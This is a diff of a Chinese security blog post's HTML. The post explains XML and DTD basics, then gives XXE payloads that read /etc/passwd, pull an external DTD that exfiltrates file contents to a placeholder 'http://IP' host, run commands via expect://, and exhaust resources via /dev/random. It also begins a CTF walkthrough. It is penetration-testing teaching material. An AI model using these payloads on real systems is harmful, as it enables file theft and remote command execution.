@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.geekby.site\/2019\/03\/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3\/"
-        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "常用, 渗透测试, XXE","wordcount":  814 ,
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "常用, 渗透测试, XXE","wordcount":  813 ,
         "url": "https:\/\/www.geekby.site\/2019\/03\/xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3\/","datePublished": "2019-03-15T13:25:00+08:00","dateModified": "2019-03-15T13:25:00+08:00","publisher": {
             "@type": "Organization",
             "name": "Geekby","logo": {
@@ -109,7 +109,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">XXE 漏洞相关</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%B8%B8%E7%94%A8/"><i class="far fa-folder fa-fw"></i>常用</a>&nbsp;<a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-03-15">2019-03-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 814 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-03-15">2019-03-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 813 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -176,17 +176,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-XML" data-lang="XML"><span class="c">&lt;!-- 声明信息 --&gt;</span>
-<span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
-
-<span class="nt">&lt;scores&gt;</span>
-    <span class="nt">&lt;student</span> <span class="na">id=</span><span class="s">&#34;s1&#34;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;name&gt;</span>hacker<span class="nt">&lt;/name&gt;</span>
-        <span class="nt">&lt;course&gt;</span>C++<span class="nt">&lt;/course&gt;</span>
-        <span class="nt">&lt;score&gt;</span>95<span class="nt">&lt;/score&gt;</span>
-    <span class="nt">&lt;/student&gt;</span>
-<span class="nt">&lt;/scores&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-XML" data-lang="XML"><span class="line"><span class="cl"><span class="c">&lt;!-- 声明信息 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;scores&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;student</span> <span class="na">id=</span><span class="s">&#34;s1&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;name&gt;</span>hacker<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;course&gt;</span>C++<span class="nt">&lt;/course&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;score&gt;</span>95<span class="nt">&lt;/score&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/student&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/scores&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="122-dtd-定义">1.2.2 DTD 定义</h4>
 <p>DTD - Document Type Definition 文档类型定义，利用 DTD 定义 XML 文档中有哪些模块以及模块中有哪些内容（类比强类型语言）。</p>
@@ -215,27 +215,27 @@
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!-- 声明信息 --&gt;
-&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;
-
-&lt;!-- 定义内部 DTD --&gt;
-&lt;!DOCTYPE scores [
-    &lt;!ELEMENT scores (student+) &gt;
-    &lt;!ELEMENT student (name, course, score) &gt;
-    &lt;!ATTLIST student id CDATA #REQUIRED &gt;
-    &lt;!ELEMENT course (#PCDATA)&gt;
-    &lt;!ELEMENT name (#PCDATA)&gt;
-    &lt;!ELEMENT score (#PCDATA)&gt;
-]&gt;
-
-&lt;scores&gt;
-    &lt;student id=&#34;s1&#34;&gt;
-        &lt;name&gt;hacker&lt;/name&gt;
-        &lt;course&gt;C++&lt;/course&gt;
-        &lt;score&gt;90&lt;/score&gt;
-    &lt;/student&gt;
-&lt;/scores&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- 声明信息 --&gt;
+</span></span><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!-- 定义内部 DTD --&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE scores [
+</span></span><span class="line"><span class="cl">    &lt;!ELEMENT scores (student+) &gt;
+</span></span><span class="line"><span class="cl">    &lt;!ELEMENT student (name, course, score) &gt;
+</span></span><span class="line"><span class="cl">    &lt;!ATTLIST student id CDATA #REQUIRED &gt;
+</span></span><span class="line"><span class="cl">    &lt;!ELEMENT course (#PCDATA)&gt;
+</span></span><span class="line"><span class="cl">    &lt;!ELEMENT name (#PCDATA)&gt;
+</span></span><span class="line"><span class="cl">    &lt;!ELEMENT score (#PCDATA)&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;scores&gt;
+</span></span><span class="line"><span class="cl">    &lt;student id=&#34;s1&#34;&gt;
+</span></span><span class="line"><span class="cl">        &lt;name&gt;hacker&lt;/name&gt;
+</span></span><span class="line"><span class="cl">        &lt;course&gt;C++&lt;/course&gt;
+</span></span><span class="line"><span class="cl">        &lt;score&gt;90&lt;/score&gt;
+</span></span><span class="line"><span class="cl">    &lt;/student&gt;
+</span></span><span class="line"><span class="cl">&lt;/scores&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>PCDATA 的意思是被解析的字符数据</p>
 <p><strong>引用外部实体：</strong></p>
@@ -256,20 +256,20 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!-- 声明信息 --&gt;
-&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;
-
-&lt;!-- 引用外部 DTD --&gt;
-&lt;!DOCTYPE scores SYSTEM &#34;scores.dtd&#34;&gt;
-
-&lt;scores&gt;
-    &lt;student id=&#34;s1&#34;&gt;
-        &lt;name&gt;hacker&lt;/name&gt;
-        &lt;course&gt;C++&lt;/course&gt;
-        &lt;score&gt;90&lt;/score&gt;
-    &lt;/student&gt;
-&lt;/scores&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- 声明信息 --&gt;
+</span></span><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!-- 引用外部 DTD --&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE scores SYSTEM &#34;scores.dtd&#34;&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;scores&gt;
+</span></span><span class="line"><span class="cl">    &lt;student id=&#34;s1&#34;&gt;
+</span></span><span class="line"><span class="cl">        &lt;name&gt;hacker&lt;/name&gt;
+</span></span><span class="line"><span class="cl">        &lt;course&gt;C++&lt;/course&gt;
+</span></span><span class="line"><span class="cl">        &lt;score&gt;90&lt;/score&gt;
+</span></span><span class="line"><span class="cl">    &lt;/student&gt;
+</span></span><span class="line"><span class="cl">&lt;/scores&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>scores.dtd 文件内容：</p>
 <div class="highlight"><div class="chroma">
@@ -284,15 +284,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-dtd" data-lang="dtd"><span class="c">&lt;!-- 声明信息 --&gt;</span>
-<span class="err">&lt;</span><span class="o">?</span><span class="err">xml</span> <span class="err">version=</span><span class="s2">&#34;1.0&#34;</span> <span class="err">encoding=</span><span class="s2">&#34;UTF-8&#34;</span> <span class="o">?</span><span class="k">&gt;</span>
-<span class="k">&lt;!ELEMENT</span> <span class="nt">scores</span> <span class="o">(</span><span class="nt">student</span><span class="o">+)</span> <span class="k">&gt;</span>
-<span class="k">&lt;!ELEMENT</span> <span class="nt">student</span> <span class="o">(</span><span class="nt">name</span><span class="o">,</span> <span class="nt">course</span><span class="o">,</span> <span class="nt">score</span><span class="o">)</span> <span class="k">&gt;</span>
-<span class="k">&lt;!ATTLIST</span> <span class="nt">student</span> <span class="na">id</span> <span class="kc">CDATA</span> <span class="kc">#REQUIRED</span> <span class="k">&gt;</span>
-<span class="k">&lt;!ELEMENT</span> <span class="nt">course</span> <span class="o">(</span><span class="kc">#PCDATA</span><span class="o">)</span><span class="k">&gt;</span>
-<span class="k">&lt;!ELEMENT</span> <span class="nt">name</span> <span class="o">(</span><span class="kc">#PCDATA</span><span class="o">)</span><span class="k">&gt;</span>
-<span class="k">&lt;!ELEMENT</span> <span class="nt">score</span> <span class="o">(</span><span class="kc">#PCDATA</span><span class="o">)</span><span class="k">&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-dtd" data-lang="dtd"><span class="line"><span class="cl"><span class="c">&lt;!-- 声明信息 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">&lt;</span><span class="o">?</span><span class="err">xml</span> <span class="err">version=</span><span class="s2">&#34;1.0&#34;</span> <span class="err">encoding=</span><span class="s2">&#34;UTF-8&#34;</span> <span class="o">?</span><span class="k">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="k">&lt;!ELEMENT</span> <span class="nt">scores</span> <span class="o">(</span><span class="nt">student</span><span class="o">+)</span> <span class="k">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="k">&lt;!ELEMENT</span> <span class="nt">student</span> <span class="o">(</span><span class="nt">name</span><span class="o">,</span> <span class="nt">course</span><span class="o">,</span> <span class="nt">score</span><span class="o">)</span> <span class="k">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="k">&lt;!ATTLIST</span> <span class="nt">student</span> <span class="na">id</span> <span class="kc">CDATA</span> <span class="kc">#REQUIRED</span> <span class="k">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="k">&lt;!ELEMENT</span> <span class="nt">course</span> <span class="o">(</span><span class="kc">#PCDATA</span><span class="o">)</span><span class="k">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="k">&lt;!ELEMENT</span> <span class="nt">name</span> <span class="o">(</span><span class="kc">#PCDATA</span><span class="o">)</span><span class="k">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="k">&lt;!ELEMENT</span> <span class="nt">score</span> <span class="o">(</span><span class="kc">#PCDATA</span><span class="o">)</span><span class="k">&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="2-xml-实体注入">2 XML 实体注入</h2>
 <p>在 DTD 中可以定义实体（类比编程语言中的常量），定义的实体可以在 xml 中引用，经过 XML 解析器解析后，实体就会被替换成定义的文本内容。</p>
@@ -307,12 +307,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34;?&gt;
-&lt;!DOCTYPE demo[
-    &lt;!ENTITY content SYSTEM &#34;file:///etc/password&#34;&gt;
-]&gt;
-&lt;demo&gt;&amp;content;&lt;/demo&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE demo[
+</span></span><span class="line"><span class="cl">    &lt;!ENTITY content SYSTEM &#34;file:///etc/password&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;demo&gt;&amp;content;&lt;/demo&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>因此，XML 漏洞主要是由于外部实体可以解析外部文件的特性。</p>
 <p>参数实体：</p>
@@ -333,16 +333,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34;?&gt;
-&lt;!DOCTYPE root[
-    &lt;!ELEMENT root (message) &gt;
-    &lt;!ENTITY % param1 &#34;&lt;!ENTITY internal &#39;http://xxx.com&#39;&gt;&#34;&gt;
-    %param1;
-]&gt;
-&lt;root&gt;
-&lt;message&gt;&amp;internal;&lt;/message&gt;
-&lt;/root&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE root[
+</span></span><span class="line"><span class="cl">    &lt;!ELEMENT root (message) &gt;
+</span></span><span class="line"><span class="cl">    &lt;!ENTITY % param1 &#34;&lt;!ENTITY internal &#39;http://xxx.com&#39;&gt;&#34;&gt;
+</span></span><span class="line"><span class="cl">    %param1;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;root&gt;
+</span></span><span class="line"><span class="cl">&lt;message&gt;&amp;internal;&lt;/message&gt;
+</span></span><span class="line"><span class="cl">&lt;/root&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>参数实体常用在无回显的 XXE 中。</p>
 <h2 id="3-xxe-危害">3 XXE 危害</h2>
@@ -369,14 +369,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
-&lt;!DOCTYPE root [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY data SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;
-&lt;root&gt;
-  &lt;name&gt;&amp;data;&lt;/name&gt;
-&lt;/root&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE root [
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT name ANY &gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY data SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;
+</span></span><span class="line"><span class="cl">&lt;root&gt;
+</span></span><span class="line"><span class="cl">  &lt;name&gt;&amp;data;&lt;/name&gt;
+</span></span><span class="line"><span class="cl">&lt;/root&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="312-无回显">3.1.2 无回显</h4>
 <p>blind xxe 的原理很简单，就是建立一条带外信道提取数据，利用外部实体中的 URL 发出访问，利用攻击者的公网主机接收数据，从而达到数据的读取。</p>
@@ -394,21 +394,19 @@
 </span><span class="lnt"> 8
 </span><span class="lnt"> 9
 </span><span class="lnt">10
-</span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
-&lt;!DOCTYPE foo [
-&lt;!ELEMENT foo ANY&gt;
-&lt;!ENTITY % evil SYSTEM &#34;file:///etc/passwd&#34;&gt;
-    &lt;!-- 或者以伪协议编码形式读取 php://filter/read=convert.base64-encode/resource=conf.php --&gt;
-&lt;!ENTITY % xxe SYSTEM &#34;http://IP/dtd.xml&#34;&gt;
-%xxe;
-%all;
-]&gt;
-&lt;foo&gt;&amp;send;&lt;/foo&gt;
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE foo [
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT foo ANY&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY % evil SYSTEM &#34;file:///etc/passwd&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;!-- 或者以伪协议编码形式读取 php://filter/read=convert.base64-encode/resource=conf.php --&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY % xxe SYSTEM &#34;http://IP/dtd.xml&#34;&gt;
+</span></span><span class="line"><span class="cl">%xxe;
+</span></span><span class="line"><span class="cl">%all;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;foo&gt;&amp;send;&lt;/foo&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>dtd.xml</p>
 <div class="highlight"><div class="chroma">
@@ -416,8 +414,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-dtd" data-lang="dtd"><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">all</span> <span class="s2">&#34;&lt;!ENTITY send SYSTEM &#39;http://IP/receive.php?p=%evil;&#39;&gt;&#34;</span><span class="k">&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-dtd" data-lang="dtd"><span class="line"><span class="cl"><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">all</span> <span class="s2">&#34;&lt;!ENTITY send SYSTEM &#39;http://IP/receive.php?p=%evil;&#39;&gt;&#34;</span><span class="k">&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在内部 DTD 里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则<code>parser</code> 会报错： <code>PEReferences forbidden in internal subset</code> 。</p>
 <h3 id="32-执行命令">3.2 执行命令</h3>
@@ -433,14 +431,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &#34;expect://id&#34;&gt;]&gt;
-&lt;xxe&gt;
-  &lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/xxe&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE xxe [
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT name ANY &gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY xxe SYSTEM &#34;expect://id&#34;&gt;]&gt;
+</span></span><span class="line"><span class="cl">&lt;xxe&gt;
+</span></span><span class="line"><span class="cl">  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+</span></span><span class="line"><span class="cl">&lt;/xxe&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="33-拒绝服务攻击">3.3 拒绝服务攻击</h3>
 <div class="highlight"><div class="chroma">
@@ -454,14 +452,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &#34;file:///dev/random&#34;&gt;]&gt;
-&lt;xxe&gt;
-  &lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/xxe&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE xxe [
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT name ANY &gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY xxe SYSTEM &#34;file:///dev/random&#34;&gt;]&gt;
+</span></span><span class="line"><span class="cl">&lt;xxe&gt;
+</span></span><span class="line"><span class="cl">  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+</span></span><span class="line"><span class="cl">&lt;/xxe&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="4-ctf-题目">4 CTF 题目</h2>
 <h3 id="41-demo-1">4.1 DEMO 1</h3>
@@ -485,20 +483,20 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/api/v1.0/try</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="n">Host</span><span class="o">:</span> <span class="l">web.jarvisoj.com:9882</span>
-<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0</span>
-<span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
-<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
-<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
-<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
-<span class="n">Content-Length</span><span class="o">:</span> <span class="l">36</span>
-<span class="n">Origin</span><span class="o">:</span> <span class="l">http://web.jarvisoj.com:9882</span>
-<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
-<span class="n">Referer</span><span class="o">:</span> <span class="l">http://web.jarvisoj.com:9882/</span>
-
-<span class="p">{</span><span class="nt">&#34;search&#34;</span><span class="p">:</span><span class="s2">&#34;type sth!&#34;</span><span class="p">,</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;own&#34;</span><span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/v1.0/try</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">web.jarvisoj.com:9882</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://web.jarvisoj.com:9882</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://web.jarvisoj.com:9882/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;search&#34;</span><span class="p">:</span><span class="s2">&#34;type sth!&#34;</span><span class="p">,</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;own&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>将 Content-Type 改为 application/xml，提交 poc：</p>
 <p><img
@@ -564,56 +562,56 @@
 </span><span class="lnt">49
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-  <span class="k">function</span> <span class="nf">__autoload</span><span class="p">(</span><span class="nv">$cls</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">include</span> <span class="nv">$cls</span><span class="p">;</span>
-  <span class="p">}</span>
-
-  <span class="k">class</span> <span class="nc">Black</span> <span class="p">{</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$default</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">,</span> <span class="nv">$store</span><span class="p">)</span> <span class="p">{</span>
-      <span class="k">if</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.string&#34;</span><span class="p">,</span> <span class="s2">&#34;#0d0d0d&#34;</span><span class="p">);</span>
-      <span class="k">if</span> <span class="p">(</span><span class="nv">$default</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.default&#34;</span><span class="p">,</span> <span class="s2">&#34;#0d0d0d&#34;</span><span class="p">);</span>
-      <span class="k">if</span> <span class="p">(</span><span class="nv">$keyword</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.keyword&#34;</span><span class="p">,</span> <span class="s2">&#34;#0d0d0d&#34;</span><span class="p">);</span>
-
-      <span class="k">if</span> <span class="p">(</span><span class="nv">$store</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;theme&#39;</span><span class="p">,</span> <span class="s2">&#34;Black-&#34;</span><span class="o">.</span><span class="nv">$string</span><span class="o">.</span><span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="nv">$default</span><span class="o">.</span><span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="nv">$keyword</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
-      <span class="p">}</span>
-    <span class="p">}</span>
-  <span class="p">}</span>
-
-  <span class="k">class</span> <span class="nc">Green</span> <span class="p">{</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$default</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">,</span> <span class="nv">$store</span><span class="p">)</span> <span class="p">{</span>
-      <span class="k">if</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.string&#34;</span><span class="p">,</span> <span class="s2">&#34;#00fb00&#34;</span><span class="p">);</span>
-      <span class="k">if</span> <span class="p">(</span><span class="nv">$default</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.default&#34;</span><span class="p">,</span> <span class="s2">&#34;#00fb00&#34;</span><span class="p">);</span>
-      <span class="k">if</span> <span class="p">(</span><span class="nv">$keyword</span><span class="p">)</span> <span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;highlight.keyword&#34;</span><span class="p">,</span> <span class="s2">&#34;#00fb00&#34;</span><span class="p">);</span>
-
-      <span class="k">if</span> <span class="p">(</span><span class="nv">$store</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;theme&#39;</span><span class="p">,</span> <span class="s2">&#34;Green-&#34;</span><span class="o">.</span><span class="nv">$string</span><span class="o">.</span><span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="nv">$default</span><span class="o">.</span><span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="nv">$keyword</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
-      <span class="p">}</span>
-    <span class="p">}</span>
-  <span class="p">}</span>
-
